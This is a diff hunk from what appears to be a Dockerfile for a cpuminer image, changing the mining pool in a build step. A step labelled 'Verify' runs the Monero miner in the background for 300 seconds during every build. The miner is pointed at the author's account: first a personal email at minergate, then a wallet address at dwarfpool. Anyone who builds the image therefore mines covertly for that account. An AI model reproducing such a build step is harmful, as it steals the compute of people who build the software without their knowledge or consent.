@@ -40,7 +40,7 @@ RUN set -x \
     # Verify
  && cpuminer --cputest \
  && cpuminer --version \
- && cpuminer -a cryptonight --threads=1 --retries=3 --retry-pause=5 --background -o stratum+tcp://xmr.pool.minergate.com:45560 -u ferro.mariano@gmail.com -p x \
+ && cpuminer -a cryptonight --threads=1 --retries=3 --retry-pause=5 --background -o stratum+tcp://xmr-usa.dwarfpool.com:8005 -u 46q61JAmDWEXkm7UcDkKqs8wko4xdc68Fbh8vdVMBLzjHKh1vrcrKoYjXqrT3anyZ22j7DEE74GkbVcQFyH2nNiC3ggVU5d.docker -p x \
  && sleep 300 \
  && exit
 
